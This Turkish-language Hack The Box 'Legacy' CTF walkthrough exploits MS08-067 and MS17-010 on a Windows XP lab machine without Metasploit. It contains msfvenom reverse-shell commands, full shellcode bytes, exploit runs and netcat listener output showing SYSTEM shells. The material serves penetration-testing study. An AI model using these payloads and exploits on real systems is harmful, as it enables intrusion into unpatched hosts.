---
{"dg-publish":true,"permalink":"/ctf/legacy-ctf/"}
---

Bu, iki SMB açığına sahip ve Metasploit ile kolayca exploit edilebilen oldukça basit bir Windows kutusu.

Bu açıklardan her ikisini de **Metasploit kullanmadan** nasıl exploit edeceğimi göstereceğim. **msfvenom ile shellcode ve payload üretecek, ayrıca pbulic scriptleri değiştirerek erişim sağlayacağım.**

**Beyond Root** bölümünde ise, Windows XP sistemlerinde `whoami` komutunun neden bulunmadığına hızlıca göz atacağım.

## Box Info

|Name|[legacy](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Flegacy)[![legacy](https://0xdf.gitlab.io/icons/box-legacy.png)](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Flegacy)  <br>[Play on HackTheBox](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Flegacy)|
|---|---|
|Release Date|15 Mar 2017|
|Retire Date|26 May 2017|
|OS|Windows ![Windows](https://0xdf.gitlab.io/icons/Windows.png)|
|Base Points|Easy [20]|
|Rated Difficulty|![Rated difficulty for legacy](https://0xdf.gitlab.io/img/legacy-diff.png)|
|Radar Graph|![Radar chart for legacy](https://0xdf.gitlab.io/img/legacy-radar.png)|
|![First Blood User](https://0xdf.gitlab.io/icons/first-blood-user.png)|18 days 17:04:44[![0x1Nj3cT0R](https://www.hackthebox.com/badge/image/22)](https://app.hackthebox.com/users/22)|
|![First Blood Root](https://0xdf.gitlab.io/icons/first-blood-root.png)|18 days 17:02:21[![0x1Nj3cT0R](https://www.hackthebox.com/badge/image/22)](https://app.hackthebox.com/users/22)|
|Creator|[![ch4p](https://www.hackthebox.com/badge/image/1)](https://app.hackthebox.com/users/1)|

## Recon

### nmap

```
nmap -p- --min-rate 10000 10.10.10.4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-05 15:17 EST
Warning: 10.10.10.4 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.4
Host is up (0.11s latency).
Not shown: 65091 closed tcp ports (reset), 441 filtered tcp ports (no-response)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 35.61 seconds
```

```
nmap -sU -p- --min-rate 10000 10.10.10.4   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-05 15:18 EST
Warning: 10.10.10.4 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.4
Host is up (0.10s latency).
Not shown: 65482 closed udp ports (port-unreach), 51 open|filtered udp ports (no-response)
PORT    STATE SERVICE
123/udp open  ntp
137/udp open  netbios-ns
```

```
nmap -sC -sV -p 139,135,445  10.10.10.4 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-05 15:19 EST
Nmap scan report for 10.10.10.4
Host is up (0.15s latency).

PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:94:35:06 (VMware)
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2025-02-11T00:18:26+02:00
|_clock-skew: mean: 5d00h58m23s, deviation: 1h24m50s, median: 4d23h58m23s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.40 seconds

```


### SMB

#### Null Auth

Ne smbmap ne de smbclient kimlik doğrulaması olmadan oturum açma yeteneği göstermez:

```
root@kali# smbmap -H 10.10.10.4
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.4...
[+] IP: 10.10.10.4:445  Name: 10.10.10.4
        Disk                                                    Permissions
        ----                                                    -----------
[!] Access Denied

root@kali# smbclient -N -L //10.10.10.4
session setup failed: NT_STATUS_INVALID_PARAMETER
```


#### Vulnerabilities

Güvenlik açıklarını kontrol etmek için nmap scriptlerini kullanacağım. Bunun bir XP host olduğu göz önüne alındığında, bazılarının olması muhtemel görünüyor.

Bu scriptlerin bir listesini nmap scripts dizinindeki dosyalara bakarak görebilirim: 

Scriptlerin tam listesini almak için script deposunu güncelleyelim . 

![Pasted image 20250205232237.png](/img/user/resimler/Pasted%20image%2020250205232237.png)

![Pasted image 20250205232318.png](/img/user/resimler/Pasted%20image%2020250205232318.png)

O zaman şu şekilde çalıştırabilirim:

```
nmap --script smb-vuln* -p 445  10.10.10.4 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-05 15:23 EST
Nmap scan report for 10.10.10.4
Host is up (0.13s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms10-054: false

Nmap done: 1 IP address (1 host up) scanned in 8.47 seconds

```

Görünüşe göre bu box, MS-08-067 (Conficker tarafından meşhur edilmiştir) ve MS-17-010 (Shadow Brokers tarafından meşhur edilmiştir) olmak üzere iki kötü şöhretli SMB açığına karşı savunmasızdır.


## System Shell

### Overview

Bu güvenlik açıklarının her ikisi de sistem olarak bir shell vermektedir. Her ikisi de temelde otomatik pwns olan Metasploit modüllerine sahiptir. Ancak bunu ilginç kılmak için (ve PWK / OSCP yapan herkesle alakalı), her birinin Metasploit olmadan nasıl yapılacağını göstereceğim.


### MS-08-067

#### Locate Exploit

Burada Github'daki jivoi'nin [exploit](https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py)'ini kullanacağım. Impacket (Kali'de yüklü olarak geliyor) gerektiren ve varsayılan shellcode'u kendiminkiyle değiştirmemi sağlayan bir python script'i. (İlginç bir şekilde, varsayılan 10.11.0.157'ye bir reverse TCP shell... yazar PWK'da olabilir gibi görünüyor).

#### Shellcode Generation

Shellcode oluşturmak için **msfvenom** kullanacağım. Exploit kodundaki örneklerden **bad character** listesini (-b) kopyalayacağım. Aşağıdaki parametreleri kullanacağım:

- **`-p windows/shell_reverse_tcp`** – Bu, hedef sistemden bana reverse bağlantı açarak bir **shell** sağlayacak. **shell_reverse_tcp** payload'ı **unstaged** olduğu için, tüm shell kodu tek seferde üretilir ve doğrudan çalıştırılabilir. **shell/reverse_tcp** kullanmış olsaydım, bu **staged** bir payload olurdu ve callback almak için **Metasploit'in `exploit/multi/handler` modülünü** kullanmam gerekirdi.
- **`LHOST=10.10.14.14 LPORT=443 EXITFUNC=thread`** – Payload için değişkenleri tanımlıyorum: **LHOST** saldırganın IP adresi, **LPORT** bağlantıyı alacak port ve **EXITFUNC** ise shell kodunun nasıl sonlandırılacağını belirler (**thread** kullanarak çıkış yapacak).
- **`-b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40"`** – Kullanılmaması gereken **bad character**’ları belirtiyorum. Bu karakterler, hedef uygulamanın bellek yapısına veya kullanılan kodlama yöntemine bağlı olarak shellcode'un çalışmasını engelleyebilir. Listeyi exploit kodundaki yorumlardan aldım.
- **`-f py`** – Çıktıyı **Python** formatında oluşturuyorum. Örnekler genellikle **C** formatında oluşturuluyor, ancak Python’a uygun şekilde düzenlemek de mümkün.
- **`-v shellcode`** – Shellcode'un **`buf`** yerine **`shellcode`** değişkenine atanmasını sağlıyorum. Kullandığım kodda **shellcode** olarak tanımlandığı için uyumlu olmasını istiyorum.
- **`-a x86 --platform windows`** – **Hedef ortamı** tanımlıyorum: **x86 mimarisi** ve **Windows platformu**.

Bu ayarlarla oluşturulan shellcode, hedef sistemde bellek bozulması (buffer overflow, SEH overwrite vb.) gibi bir güvenlik açığını tetikleyerek saldırganın remote komut yürütmesine olanak tanıyacak.

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.9 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 348 (iteration=0)
x86/call4_dword_xor chosen with final size 348
Payload size: 348 bytes
Final size of py file: 1953 bytes
shellcode =  b""
shellcode += b"\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0"
shellcode += b"\x5e\x81\x76\x0e\x1c\xf6\xfe\xc8\x83\xee\xfc"
shellcode += b"\xe2\xf4\xe0\x1e\x7c\xc8\x1c\xf6\x9e\x41\xf9"
shellcode += b"\xc7\x3e\xac\x97\xa6\xce\x43\x4e\xfa\x75\x9a"
shellcode += b"\x08\x7d\x8c\xe0\x13\x41\xb4\xee\x2d\x09\x52"
shellcode += b"\xf4\x7d\x8a\xfc\xe4\x3c\x37\x31\xc5\x1d\x31"
shellcode += b"\x1c\x3a\x4e\xa1\x75\x9a\x0c\x7d\xb4\xf4\x97"
shellcode += b"\xba\xef\xb0\xff\xbe\xff\x19\x4d\x7d\xa7\xe8"
shellcode += b"\x1d\x25\x75\x81\x04\x15\xc4\x81\x97\xc2\x75"
shellcode += b"\xc9\xca\xc7\x01\x64\xdd\x39\xf3\xc9\xdb\xce"
shellcode += b"\x1e\xbd\xea\xf5\x83\x30\x27\x8b\xda\xbd\xf8"
shellcode += b"\xae\x75\x90\x38\xf7\x2d\xae\x97\xfa\xb5\x43"
shellcode += b"\x44\xea\xff\x1b\x97\xf2\x75\xc9\xcc\x7f\xba"
shellcode += b"\xec\x38\xad\xa5\xa9\x45\xac\xaf\x37\xfc\xa9"
shellcode += b"\xa1\x92\x97\xe4\x15\x45\x41\x9e\xcd\xfa\x1c"
shellcode += b"\xf6\x96\xbf\x6f\xc4\xa1\x9c\x74\xba\x89\xee"
shellcode += b"\x1b\x09\x2b\x70\x8c\xf7\xfe\xc8\x35\x32\xaa"
shellcode += b"\x98\x74\xdf\x7e\xa3\x1c\x09\x2b\x98\x4c\xa6"
shellcode += b"\xae\x88\x4c\xb6\xae\xa0\xf6\xf9\x21\x28\xe3"
shellcode += b"\x23\x69\xa2\x19\x9e\xf4\xc2\x0c\xff\x96\xca"
shellcode += b"\x1c\xf7\x45\x41\xfa\x9c\xee\x9e\x4b\x9e\x67"
shellcode += b"\x6d\x68\x97\x01\x1d\x99\x36\x8a\xc4\xe3\xb8"
shellcode += b"\xf6\xbd\xf0\x9e\x0e\x7d\xbe\xa0\x01\x1d\x74"
shellcode += b"\x95\x93\xac\x1c\x7f\x1d\x9f\x4b\xa1\xcf\x3e"
shellcode += b"\x76\xe4\xa7\x9e\xfe\x0b\x98\x0f\x58\xd2\xc2"
shellcode += b"\xc9\x1d\x7b\xba\xec\x0c\x30\xfe\x8c\x48\xa6"
shellcode += b"\xa8\x9e\x4a\xb0\xa8\x86\x4a\xa0\xad\x9e\x74"
shellcode += b"\x8f\x32\xf7\x9a\x09\x2b\x41\xfc\xb8\xa8\x8e"
shellcode += b"\xe3\xc6\x96\xc0\x9b\xeb\x9e\x37\xc9\x4d\x1e"
shellcode += b"\xd5\x36\xfc\x96\x6e\x89\x4b\x63\x37\xc9\xca"
shellcode += b"\xf8\xb4\x16\x76\x05\x28\x69\xf3\x45\x8f\x0f"
shellcode += b"\x84\x91\xa2\x1c\xa5\x01\x1d"

```



Bu shellcode'u script'in içine alacağım ve varsayılanın yerine yapıştıracağım. Ayrıca, bir gün geri döndüğümde ne yaptığını bilmem için, onu oluşturmak için çalıştırdığım msfvenom komut dizesiyle birlikte üzerine bir yorum yapıştırmayı seviyorum.


#### Guess Version

Exploit, Windows sürümünü ve Dil paketini bilmemi gerektiriyor:

ChatGpt'ti tarafından yazılan kodum . 

```
# MS08-067 Exploit için Versiyon Tahmin Mekanizması
import sys
from impacket import smb

target_ip = "10.10.10.4"  # Örnek IP

try:
    conn = smb.SMB('*SMBSERVER', target_ip)
    conn.login('', '')  # Boş oturum açma denemesi
    print(f"OS: {conn.get_server_os()}")
except Exception as e:
    print(f"Bağlantı hatası: {e}")
```

![Pasted image 20250205234013.png](/img/user/resimler/Pasted%20image%2020250205234013.png)

Exploit, bazı küçük kod parçalarının bellekte nerede olacağını bilmenin avantajını kullanır ve shell'e giden yolda bu bitleri kullanır. Windows'un farklı sürümleri için bu araçların adresleri farklı olacaktır. Örneğin, kaynaktan:

```
        elif (self.os == '4'):
            print 'Windows 2003 SP1 English\n'
            ret_dec = "\x8c\x56\x90\x7c"  # 0x7c 90 56 8c dec ESI, ret @SHELL32.DLL
            ret_pop = "\xf4\x7c\xa2\x7c"  # 0x 7c a2 7c f4 push ESI, pop EBP, ret @SHELL32.DLL
            jmp_esp = "\xd3\xfe\x86\x7c"  # 0x 7c 86 fe d3 jmp ESP @NTDLL.DLL
            disable_nx = "\x13\xe4\x83\x7c"  # 0x 7c 83 e4 13 NX disable @NTDLL.DLL
            jumper = disableNXjumper % (
                ret_dec * 6, ret_pop, disable_nx, jmp_esp * 2)
```

Numaralandırmama dayanarak, Windows XP olduğunu biliyorum. İlk olarak hedef 6'yı deneyeceğim, Windows XP SP3 İngilizce (NX). Eğer bu başarısız olursa, geri gelip diğerlerini deneyeceğim.

#### Run Exploit
Bir nc listener açacağım ve exploit'i çalıştıracağım:

```
root@kali# python ms08-067.py 10.10.10.4 6 445
#######################################################################
#   MS08-067 Exploit
#   This is a modified verion of Debasis Mohanty's code (https://www.exploit-db.com/exploits/7132/).
#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi
#
#   Mod in 2018 by Andy Acer
#   - Added support for selecting a target port at the command line.
#   - Changed library calls to allow for establishing a NetBIOS session for SMB transport
#   - Changed shellcode handling to allow for variable length shellcode.
#######################################################################

$   This version requires the Python Impacket library version to 0_9_17 or newer.
$
$   Here's how to upgrade if necessary:
$
$   git clone --branch impacket_0_9_17 --single-branch https://github.com/CoreSecurity/impacket/
$   cd impacket
$   pip install .

#######################################################################

Windows XP SP3 English (NX)

[-]Initiating connection
[-]connected to ncacn_np:10.10.10.4[\pipe\browser]
Exploit finish
```

Çalışırken, listener'ımdan bir callback alıyorum:

```
root@kali# nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.4.
Ncat: Connection from 10.10.10.4:1028.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```

Ve oradan her iki bayrağı da alabilirim:

```
C:\Documents and Settings\john\Desktop>type user.txt
e69af0e4...

C:\Documents and Settings\Administrator\Desktop>type root.txt
993442d2...
```


### MS-17-010

#### Locate Exploit

MS-17-010 kodu içeren birkaç GitHub var, ancak XP'de çalışan çok fazla kod yok. Benim favorim helviojunior tarafından worawit'in MS17-010 reposunun fork'u. Bir send_and_execute.py eklemiş, bir executable verebilirim ve onu yükleyip çalıştırır.

Komut dosyasının bir kopyasını alacağım:

```
root@kali# wget https://raw.githubusercontent.com/helviojunior/MS17-010/master/send_and_execute.py
--2019-02-19 14:05:59--  https://raw.githubusercontent.com/helviojunior/MS17-010/master/send_and_execute.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.248.133
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.248.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 43783 (43K) [text/plain]
Saving to: ‘send_and_execute.py’

send_and_execute.py                                         100%[========================================================================================================================================>]  42.76K  --.-KB/s    in 0.01s   

2019-02-19 14:05:59 (3.19 MB/s) - ‘send_and_execute.py’ saved [43783/43783]
```


#### Generate Payload

Yine msfvenom kullanacağım. Bu kez, bir exe kullanabileceğim için bad karakterler veya değişken adları konusunda endişelenmeme gerek yok:

```
root@kali# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o rev_10.10.14.14_443.exe
No encoder or badchars specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: rev_10.10.14.14_443.exe

```

#### Run Exploit

Şimdi bir listener başlatacağım ve ardından exploit'i çalıştıracağım:

```
root@kali# python send_and_execute.py 10.10.10.4 rev_10.10.14.14_443.exe
Trying to connect to 10.10.10.4:445
Target OS: Windows 5.1
Using named pipe: browser
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x82246bb8
SESSION: 0xe10f9408
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x78b50
TRANS2: 0x7ac90
modify transaction struct for arbitrary read/write
make this SMB session to be SYSTEM
current TOKEN addr: 0xe1b1df10
userAndGroupCount: 0x3
userAndGroupsAddr: 0xe1b1dfb0
overwriting token UserAndGroups
Sending file N0KFUJ.exe...
Opening SVCManager on 10.10.10.4.....
Creating service TMkY.....
Starting service TMkY.....
The NETBIOS connection with the remote host timed out.
Removing service TMkY.....
ServiceExec Error on: 10.10.10.4
nca_s_proto_error
Done
```

And I get a shell:

```
root@kali# nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.4.
Ncat: Connection from 10.10.10.4:1029.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```

## Beyond Root - Whoami

XP'de whoami binary'si ya da komutu yok! Yani bu iki açıkla da sistemde olduğumdan şüphelenirken, bunu nasıl bilebilirdim ki?

```
C:\WINDOWS\system32>whoami
whoami
'whoami' is not recognized as an internal or external command,
operable program or batch file.
```

Çoğu kullanıcı için echo ve %username% ortam değişkenini kullanabilirim:

```
C:\WINDOWS\system32>echo %username%
%username%
```

Bu environment değişkeninin genişlememesi sistemde olduğuma dair iyi bir işaret. Daha ileri gitmek istersem, zaten varsayılan olarak kali'de bulunan whoami.exe'yi kullanabilirim:

```
root@kali# locate whoami.exe
/usr/share/windows-binaries/whoami.exe
```

Bu klasörü komutla SMB üzerinden paylaşacağım:

```
root@kali# smbserver.py a /usr/share/windows-binaries/
Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Şimdi çalıştıracağım ve sistemde olduğumu göreceğim:

```
C:\WINDOWS\system32>\\10.10.14.14\a\whoami.exe NT AUTHORITY\SYSTEM
```

Elbette kontrol edebileceğim başka yollar da var, belirli yerlere yazma erişimine sahip olmak gibi (örneğin system32). Whoami.exe dosyasını almak kesinlikle en kolay ve en kesin yöntemlerden biri.